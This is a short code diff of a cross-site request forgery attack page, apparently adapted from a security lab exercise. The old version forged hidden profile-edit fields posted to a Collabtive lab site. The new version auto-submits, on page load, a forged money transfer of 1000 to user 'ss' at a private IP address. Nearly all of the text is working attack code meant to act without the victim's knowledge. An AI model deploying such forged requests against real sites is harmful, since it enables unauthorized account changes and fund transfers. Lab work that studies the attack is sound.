@@ -23,10 +23,9 @@
         // The following are form entries that need to be filled out
         // by attackers. The entries are made hidden, so the victim
         // won't be able to see them.
-        fields += "<input type='hidden' name='name' value='admin' >"; 
-        fields += "<input type='hidden' name='gender' value='female' >"; //修改性别
-        fields += "<input type='hidden' name='company' value='seed' >"; //修改公司名
-        post('http://www.csrflabcollabtive.com/manageuser.php?action=edit', fields);
+        fields += "<input type='text' name='user_to' value='ss' >"; 
+        fields += "<input type='number' name='amount' value='1000' >"; //修改性别
+        post('http://192.168.2.98:49698/transfer', fields);
     }
     // invoke csrf_hack() after the page is loaded.
     window.onload = function() {
